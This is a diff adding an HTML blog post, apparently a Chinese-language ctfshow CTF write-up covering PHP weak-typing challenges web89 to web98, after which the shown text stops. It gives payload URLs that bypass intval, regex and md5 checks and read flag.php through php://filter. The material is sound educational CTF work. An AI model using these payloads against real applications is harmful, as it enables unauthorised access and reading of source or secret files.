@@ -1,0 +1,510 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/"><meta name="generator" content="Astro v5.12.0"><!-- General Meta Tags --><title>ctfshow Web入门[PHP特性] web89-110 Writeup | X1r0z Blog</title><meta name="title" content="ctfshow Web入门[PHP特性] web89-110 Writeup | X1r0z Blog"><meta name="description" content="PHP 的相关特性, 例如弱类型, 变量覆盖"><meta name="author" content="X1r0z"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="ctfshow Web入门[PHP特性] web89-110 Writeup | X1r0z Blog"><meta property="og:description" content="PHP 的相关特性, 例如弱类型, 变量覆盖"><meta property="og:url" content="https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/"><meta property="og:image" content="https://exp10it.io/og.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2022-08-10T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/"><meta property="twitter:title" content="ctfshow Web入门[PHP特性] web89-110 Writeup | X1r0z Blog"><meta property="twitter:description" content="PHP 的相关特性, 例如弱类型, 变量覆盖"><meta property="twitter:image" content="https://exp10it.io/og.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"ctfshow Web入门[PHP特性] web89-110 Writeup | X1r0z Blog","image":"https://exp10it.io/og.png","datePublished":"2022-08-10T00:00:00.000Z","author":[{"@type":"Person","name":"X1r0z","url":"https://exp10it.io/"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="X1r0z Blog" href="https://exp10it.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.D98dxaWf.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.Cn_dDryL.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: ctfshow-web\5165\95E8-php\7279\6027-web-89-110-writeup; }@layer astro { ::view-transition-old(ctfshow-web\5165\95E8-php\7279\6027-web-89-110-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(ctfshow-web\5165\95E8-php\7279\6027-web-89-110-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(ctfshow-web\5165\95E8-php\7279\6027-web-89-110-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(ctfshow-web\5165\95E8-php\7279\6027-web-89-110-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: ctf; }@layer astro { ::view-transition-old(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute start-16 -top-full z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-app flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none"> X1r0z Blog </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/links">
+Links
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="mx-auto max-w-app px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-app items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-app px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> ctfshow Web入门[PHP特性] web89-110 Writeup </h1> <div class="my-2 flex items-center gap-2"> <div class="flex items-center gap-x-2 opacity-80"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg>  <time class="text-sm sm:text-base" datetime="2022-08-10T00:00:00.000Z">10 Aug, 2022</time> </div> <span aria-hidden="true" class="max-sm:hidden">|</span> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/ctf/ctfshow/ctfshow-web-php-89-110-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent max-sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> </div> <article id="article" class="app-prose mx-auto mt-8 max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg)"> <h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#web89">web89</a></li>
+<li><a href="#web90">web90</a></li>
+<li><a href="#web91">web91</a></li>
+<li><a href="#web92">web92</a></li>
+<li><a href="#web93">web93</a></li>
+<li><a href="#web94">web94</a></li>
+<li><a href="#web95">web95</a></li>
+<li><a href="#web96">web96</a></li>
+<li><a href="#web97">web97</a></li>
+<li><a href="#web98">web98</a></li>
+<li><a href="#web99">web99</a></li>
+<li><a href="#web100">web100</a></li>
+<li><a href="#web101">web101</a></li>
+<li><a href="#web102">web102</a></li>
+<li><a href="#web103">web103</a></li>
+<li><a href="#web104">web104</a></li>
+<li><a href="#web105">web105</a></li>
+<li><a href="#web106">web106</a></li>
+<li><a href="#web107">web107</a></li>
+<li><a href="#web108">web108</a></li>
+<li><a href="#web109">web109</a></li>
+<li><a href="#web110">web110</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="web89">web89</h2>
+<p><img src="https://img.exp10it.io/img/202208101050983.png" alt=""></p>
+<p><code>http://44237afb-ae1e-47ea-8b59-d43af0ddf381.challenge.ctf.show/?num[]=a</code></p>
+<p><code>preg_match()</code> 匹配数组时会返回 false</p>
+<p>而 <code>intval()</code> 接受数组后仍返回 true</p>
+<h2 id="web90">web90</h2>
+<p><img src="https://img.exp10it.io/img/202208101105810.png" alt=""></p>
+<p>这里 <code>===</code> 不仅会判断内容是否相同, 而且还会判断类型是否相同</p>
+<p>PHP 文档</p>
+<p><img src="https://img.exp10it.io/img/202208101106957.png" alt=""></p>
+<p>当 base 为 0 时, 会检测 value 的格式来决定使用的进制</p>
+<p>我们可以使用八进制或者十六进制绕过</p>
+<p>或者使用 <code>1146.0</code> <code>1146aaa</code>, 因为 <code>intval()</code> 是一个<strong>取整</strong>函数, 非整数部分都会被截断, 包括字符串</p>
+<p>payload</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=0x117c</span></span>
+<span class="line"><span>http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=1146.0</span></span>
+<span class="line"><span>http://e1400b46-43c1-413e-a644-00d0f4fc4559.challenge.ctf.show/?num=1146aaa</span></span></code></pre>
+<h2 id="web91">web91</h2>
+<p><img src="https://img.exp10it.io/img/202208101113835.png" alt=""></p>
+<p><code>/i</code> 表示忽略大小写, <code>/m</code> 表示多行匹配, <code>^</code> 表示匹配开头, <code>$</code> 表示匹配结尾</p>
+<p>即多行/单行匹配以 <code>php</code> 为开头和结尾的字符串</p>
+<p>多行匹配 (不匹配换行符)</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="regex"><code><span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">^</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">xxx</span><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">$</span></span>
+<span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">^</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">yyy</span><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">$</span></span>
+<span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">^</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">zzz</span><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">$</span></span></code></pre>
+<p>单行匹配 (匹配换行符, 相当于一行)</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="regex"><code><span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">^</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">xxx</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">yyy</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">zzz</span><span style="--shiki-light:#1976D2;--shiki-dark:#D6DEEB">$</span></span></code></pre>
+<p>这里我们用换行符通过第一个 if, 绕过第二个 if, 得到 flag</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://10c6de4e-34f6-40db-aea3-0be726db896f.challenge.ctf.show/?cmd=%0aphp</span></span>
+<span class="line"><span>http://10c6de4e-34f6-40db-aea3-0be726db896f.challenge.ctf.show/?cmd=abc%0aphp</span></span></code></pre>
+<p>看了 hint 才知道这原来是一个解析漏洞…</p>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p>
+<h2 id="web92">web92</h2>
+<p><img src="https://img.exp10it.io/img/202208101138737.png" alt=""></p>
+<p>相比于之前那题把 <code>===</code> 改成了 <code>==</code></p>
+<p>这时候用 <code>==</code> 比较的时候会进行弱类型转换, <code>4476.0</code> 不能用了, 但 <code>4476.1</code> 可以用</p>
+<p>另外还能用科学计数法, <code>123e456</code> 就是 <code>123x10^456</code>, 这里因为传参是当字符串处理的, 传递 <code>4476e123</code> 在类型转换后会被当作科学计数法, 而在 <code>intval()</code> 中则是取整, 遇到字母 <code>e</code> 后被截断</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=0x117c</span></span>
+<span class="line"><span>http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=4476.1</span></span>
+<span class="line"><span>http://0c177459-605c-4c7b-aadf-072390d97a5c.challenge.ctf.show/?num=4476e123</span></span></code></pre>
+<h2 id="web93">web93</h2>
+<p><img src="https://img.exp10it.io/img/202208101156543.png" alt=""></p>
+<p>十六进制和科学计数法不能用了, 但八进制和小数点还能用</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://637429f9-17ba-4740-8ce0-d6d0a4d30560.challenge.ctf.show/?num=4476.1</span></span>
+<span class="line"><span>http://637429f9-17ba-4740-8ce0-d6d0a4d30560.challenge.ctf.show/?num=010574</span></span></code></pre>
+<h2 id="web94">web94</h2>
+<p><img src="https://img.exp10it.io/img/202208101200379.png" alt=""></p>
+<p>注意这里的 <code>!strpos()</code>, <code>strops()</code> 返回对应字符第一次出现的位置</p>
+<p>如果我们使用八进制 <code>010574</code>, <code>strpos("010574", "0")</code> 返回0, 也就是 false, 加了 <code>!</code> 后反而变成 true</p>
+<p>所以字符串中必须有0, 但0不能在首位 (过滤了八进制), 可以用小数点绕过</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://7032c441-7ef1-4baa-bfb3-212c1d5cdb9d.challenge.ctf.show/?num=4476.0123</span></span></code></pre>
+<p>网上 wp 中有一个加空格的方法, 可以绕过八进制的过滤</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://7032c441-7ef1-4baa-bfb3-212c1d5cdb9d.challenge.ctf.show/?num=%20010574</span></span></code></pre>
+<h2 id="web95">web95</h2>
+<p><img src="https://img.exp10it.io/img/202208101207608.png" alt=""></p>
+<p>小数点过滤了, 可以用空格+八进制, 空格在转换时会被自动去除</p>
+<p>测试的时候发现前面加上其它东西也能通过</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%20010574</span></span>
+<span class="line"><span>http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%0a010574</span></span>
+<span class="line"><span>http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=%09010574</span></span>
+<span class="line"><span>http://b4c7751b-3de6-4337-9952-205d726abbcc.challenge.ctf.show/?num=+010574</span></span></code></pre>
+<h2 id="web96">web96</h2>
+<p><img src="https://img.exp10it.io/img/202208101213482.png" alt=""></p>
+<p>类似文件包含</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=php://filter/convert.base64-encode/resource=flag.php</span></span></code></pre>
+<p>或者用绝对路径和相对路径</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=/var/www/html/flag.php</span></span>
+<span class="line"><span>http://ae720f5a-c4fd-4b54-9e74-8e27500c3eb7.challenge.ctf.show/?u=./flag.php</span></span></code></pre>
+<h2 id="web97">web97</h2>
+<p><img src="https://img.exp10it.io/img/202208101219528.png" alt=""></p>
+<p>md5 0e 漏洞?</p>
+<p>如果是 <code>==</code> 的话, 任意两个字符串加密后生成的 md5 为字符串类型, 进行比较的时候, 以 0e 开头的字符串例如 <code>0e123</code> 和 <code>0e456</code>, 会被类型转换为科学计数法, 即 <code>0==0</code>, 返回 true</p>
+<p>但这里是 <code>===</code>, 两个字符串类型的 <code>0e123</code> 和 <code>0e456</code> 进行比较时, 不会进行类型转换, 只进行字符串内容的比较, 而这里很明显不相等, 返回 false</p>
+<p>那要怎么绕过? 用数组</p>
+<p>利用 md5 加密数组时, 会报错并返回 NULL</p>
+<p><img src="https://img.exp10it.io/img/202208101231423.png" alt=""></p>
+<p>而无论是 <code>NULL == NULL</code> 还是 <code>NULL === NULL</code>, 都会返回 true, 所以就通过了这个 if 的判断</p>
+<p><img src="https://img.exp10it.io/img/202208101232515.png" alt=""></p>
+<h2 id="web98">web98</h2>
+<p><img src="https://img.exp10it.io/img/202208101235205.png" alt=""></p>
+<p><code>&#x26;</code> 为 php 的引用</p>
+<blockquote>
+<p>在PHP 中引用的意思是: <strong>不同的名字访问同一个变量内容</strong>.
+与Ｃ语言中的指针是有差别的. Ｃ语言中的指针里面存储的是变量的内容, 在内存中存放的地址.</p>
+</blockquote>
+<p>首先判断 GET 是否有参数, 有的话就把 <code>$_POST</code> 的引用给 <code>$_GET</code> (即下面的 <code>$_GET</code> 全部都当作 <code>$_POST</code>)</p>
+<p>然后判断 <code>$_POST['flag']</code> 的内容是否为 <code>flag</code>, 是的话把 <code>$_COOKIE</code> 的引用给 <code>$_GET</code> (即下面的 <code>$_GET</code> 全部都当作 <code>$_COOKIE</code>)</p>
+<p>然后判断 <code>$_COOKIE['flag']</code> 的内容是否为 <code>flag</code>, 是的话把 <code>$_SERVER</code> 的引用给 <code>$_GET</code> (即下面的 <code>$_GET</code> 全部都当作 <code>$_SERVER'</code>)</p>
+<p>最后判断 <code>$_SERVER['HTTP_FLAG']</code> 的内容是否为 <code>flag</code>, 是的话输出 <code>$flag</code> 的内容</p>
+<p>payload 如下</p>
+<p><img src="https://img.exp10it.io/img/202208101248545.png" alt=""></p>
+<p>hint 的方法如下, 省去了中间两步的判断, 没有那么绕了</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET 一个 ?HTTP_FLAG=flag 加 POST 一个 HTTP_FLAG=flag</span></span></code></pre>
